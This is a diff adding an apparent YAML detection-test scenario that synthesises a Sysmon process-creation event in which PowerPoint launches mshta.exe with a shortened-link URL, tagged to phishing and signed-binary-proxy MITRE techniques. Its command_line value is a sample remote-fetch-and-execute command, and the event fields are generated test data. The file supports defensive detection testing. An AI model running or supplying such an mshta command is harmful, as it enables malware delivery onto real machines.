@@ -1,0 +1,109 @@
+type: scenario
+description: |
+  An Office application starts a program with a web address on its command
+  line. Sysmon EID 1 (Process Create) records the child, for example
+  mshta.exe, with an https URL argument, for example a shortened link, and
+  an Office application such as POWERPNT.EXE as its parent. The event
+  records the command, not whether the URL was fetched.
+tags: [eid1]
+mitre:
+  tactics: [initial-access, defense-evasion]
+  techniques: [T1566.001, T1218.005]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  event_record_id:     gen.int(min=5000, max=9999999)
+  user_name:           Administrator
+  user:                "${ref.domain_short}\\${ref.user_name}"
+  logon_guid_raw:      fn.upper(gen.uuid())
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=6, case=lower)
+  logon_id:            "0x${ref.logon_id_hex}"
+  process_guid_raw:    fn.upper(gen.uuid())
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=1000, max=9999)
+  parent_guid_raw:     fn.upper(gen.uuid())
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=1000, max=9999)
+  image:               'C:\Windows\System32\mshta.exe'
+  command_line:        '"mshta""https:\\j.mp\obi3zfngcbyc56rcegve"'
+  parent_image:        'C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE'
+  parent_command_line: '"${ref.parent_image}" '
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": ref.image
+            - "@Name": FileVersion
+              "#text": "11.00.14393.2007 (rs1_release.171231-1800)"
+            - "@Name": Description
+              "#text": "Microsoft (R) HTML Application host"
+            - "@Name": Product
+              "#text": "Internet Explorer"
+            - "@Name": Company
+              "#text": "Microsoft Corporation"
+            - "@Name": OriginalFileName
+              "#text": "MSHTA.EXE"
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": "C:\\Temp\\"
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": "2"
+            - "@Name": IntegrityLevel
+              "#text": "High"
+            - "@Name": Hashes
+              "#text": "MD5=5CED5D5B469724D9992F5E8117ECEFB5,SHA256=9D58F407AC581DB4A39066F7CB549BF73709EC3D81EF352801C9FB0235EA7FBC,IMPHASH=BECF3D88380DC97C52B1C2E7B1BCCF4B"
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": ref.parent_image
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
